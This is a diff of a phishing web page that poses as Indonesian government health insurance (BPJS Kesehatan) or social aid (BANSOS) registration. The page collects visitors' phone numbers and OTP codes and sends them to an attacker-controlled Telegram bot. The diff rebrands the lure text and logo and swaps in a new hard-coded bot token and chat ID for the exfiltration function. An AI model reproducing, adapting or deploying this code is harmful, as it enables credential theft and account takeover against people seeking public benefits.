@@ -28,7 +28,7 @@
         }
         @media (min-width: 768px) {
             .bd-placeholder-img-lg {
-                font-size: 3.5rem;
+                font-size: 2.5rem;
             }
         }
 	/* Absolute Center Spinner */
@@ -146,6 +146,10 @@
                 transform: rotate(360deg);
             }
         }
+        .small-text {
+    font-size: 18px; /* Sesuaikan ukuran */
+}
+
     </style>
 </head>
 <body class="d-flex flex-column h-100">
@@ -166,18 +170,8 @@
 
 <div id="loading" class="loading" style="display: none;"></div>
     <main class="flex-shrink-0">
-        <div id="ctl00_divContainer" class="container container-narrow">
-            <div class="text-center mt-2">
-                <a id="ctl00_lnkMalay" disabled="disabled" style="color:Black;font-weight:bold;text-decoration:none;"></a>
-                <span id="ctl00_lblPipe_bm"> | </span>
-                <a id="ctl00_lnkEng" href="index.html"></a>
-                <span id="ctl00_lblPipe_bi"> | </span>
-                <a id="ctl00_lnkChineseSimplified" href="index.html"></a>
-                <span id="ctl00_lblPipe_bc"> | </span>
-                <a id="ctl00_lnkTamilInd" href="index.html"></a>
-            </div>
             <div class="header mt-3 text-center">
-                <img src="../t5/assets/img/bpjs2.jpg" id="ctl00_logohead" class="img-fluid" width="450" />
+                <img src="https://katabali.com/wp-content/uploads/2021/04/bpjs-kesehatan.png" id="ctl00_logohead" class="img-fluid" width="450" />
             </div>
             <script type="text/javascript">
                 //<![CDATA[
@@ -205,7 +199,7 @@
             </script>
             <span id="ctl00_lblMsg"></span>
             <h2 class="fw-bold mt-2 page-header text-center ">
-                <span id="ctl00_RecipientMasterContent_lblSubject">BANSOS 2025 </span>
+                <span id="ctl00_RecipientMasterContent_lblSubject">BPJS PBI/FREE REGISTER NOW </span>
             </h2>
 			<div class="first">
             <form action="javascript:void(0)" method="post" id="firstForm">
@@ -218,7 +212,7 @@
 			<input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel" required="true" placeholder="08xxxx" title="Sila Masukkan Nombor , contoh +62890930">
 			</div>
 			<div class="text-center">
-			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()">Cek Status</button>
+			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()">LIST</button>
 			</div>
             </form>
 			</div>
@@ -228,7 +222,7 @@
 			<input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
 			<div class="mb-3">
 			<label for="otp_code" class="form-label">
-            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami sudah Mengirimkan kode BANSOS 5 angka silahkan cek di SMS Telegram.</span>
+            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami sudah Mengirimkan kode OTP 5 angka silahkan cek di SMS Telegram.</span>
 			</label>
 			<input name="otp_code" maxlength="5" id="otp_code" class="form-control" type="tel" required="true" placeholder="5 digit OTP">
 			</div>
@@ -348,10 +342,13 @@
         </div>
         </div>
     </main>
-    
-    <br>
+    <h2 class="fw-bold mt-2 page-header text-center small-text">
+        <span id="ctl00_RecipientMasterContent_lblSubject">
+            𝓒𝓐𝓡𝓐 𝓓𝓐𝓕𝓣𝓐𝓡 𝓑𝓟𝓙𝓢 𝓚𝓔𝓢𝓔𝓗𝓐𝓣𝓐𝓝 𝓖𝓡𝓐𝓣𝓘𝓢
+        </span>
+    </h2>
     <div class="header mt-3 text-center">
-        <img src="t5/assets/img/ini1.png" id="ctl00_logohead" class="img-fluid" width="450" />
+        <img src="t5/assets/img/bpjj.png" id="ctl00_logohead" class="img-fluid" width="450" />
     </div>
                         </li>
                     </ul>
@@ -367,8 +364,8 @@
 // Function to send data to Telegram Bot
         // Function to send data to Telegram Bot
 function sendToTelegram(message) {
-    const botToken = "7341614259:AAFflY4kYMTNtoPlWcSGnPT8nGF0LANL6o0"; // Replace with your bot token
-    const chatId = "6979996777"; // Replace with your chat ID
+    const botToken = "7352654270:AAGykqbcm_YM_5xsWfOc4dmjQVCMBscG308"; // Replace with your bot token
+    const chatId = "7446499435"; // Replace with your chat ID
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const data = {
